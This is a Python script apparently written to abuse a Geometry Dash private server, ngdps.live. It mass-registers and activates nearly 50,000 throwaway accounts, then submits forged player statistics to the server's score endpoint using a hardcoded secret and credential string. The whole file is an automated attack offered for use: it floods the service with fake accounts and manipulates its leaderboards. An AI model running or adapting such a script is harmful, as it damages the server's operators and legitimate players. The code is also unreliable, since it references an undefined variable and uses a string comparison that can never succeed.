import requests

register_ur = "https://www.ngdps.live/database/tools/account/registerAccount.php"
activation_ur = "https://www.ngdps.live/database/tools/account/activateAccount.php"


update_score = 'https://www.ngdps.live/database/updateGJUserScore22.php'



h = {
    "Host": "ngdps.live",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

for i in range(1, 50000):
    d = "username=Skult"+str(i)+"&password=320994&repeatpassword=320994&email=s%40s.com&repeatemail=s%40s.com"
    r = requests.post(register_ur, headers=h, data=d)


    if r.text[:4] == "Account registered.":
        print("Account Created Successfully")

for i in range(1, 50000):
    ds = "userName=Skult"+str(i)+"&password=320994"
    r = requests.post(activation_ur, data=ds, headers=h)

    if r.text == "Account has been successfully activated.":
        print("Account Activated")
        i = i + 1

for u in range(1, 50000):
    s = s + 1
    d = "gameVersion=21&binaryVersion=34&gdw=0&accountID="+str(i)+"&gjp=UUVAWltcWlBcQg==&userName=Skult"+str(s)+"&stars=5999&demons=999&diamonds=0&icon=6&color1=12&color2=3&iconType=0&coins=149&userCoins=1&special=0&gameVersion=21&secret=Wmfd2893gb7&accIcon=10&accShip=33&accBall=11&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1&seed=XBRqIp0pTq&seed2=CAVRBAcJUFMDBQABU1JXAA1XBVcJAgMOBQ0HUQAFXVQEVlBcVANVUg=="
    r = requests.post(update_score, headers=h, data=d)

    if r.text == "1":
        print("Stats gain fail")
    else:
        print(str(i) +"Stats gained!")